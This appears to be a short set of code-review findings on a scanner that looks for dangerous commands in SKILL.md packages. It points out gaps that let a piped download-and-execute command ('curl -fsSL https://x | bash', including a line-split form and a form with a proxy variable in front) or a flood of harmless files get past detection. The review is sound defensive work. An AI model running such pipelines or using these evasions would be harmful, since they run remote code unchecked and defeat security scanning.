  - body: This walks up to `maxFiles` SKILL.md files before collecting code files, so a package with many benign SKILL.md files can leave no budget for JS/TS files and avoid existing critical code rules. Preserve the current code-scan guarantee while adding a bounded SKILL.md pass.
  - confidence: 0.92

  - body: `logicalMarkdownLines` only joins backslash continuations, so `curl -fsSL https://x |` followed by `bash` is evaluated as two separate lines and never produces a `markdown-download-exec` finding even though shells execute it as one pipeline.
  - confidence: 0.89
- **[P2] Skip assignment prefixes before downloader matching:** `src/security/skill-scanner.ts:486-506`
  - body: `isDownloadCommandSegment` returns on the first token that is not `sudo`, `doas`, or `env`, so shell assignment forms like `HTTPS_PROXY=http://p curl -fsSL https://x | bash` miss the downloader and bypass the new critical rule.
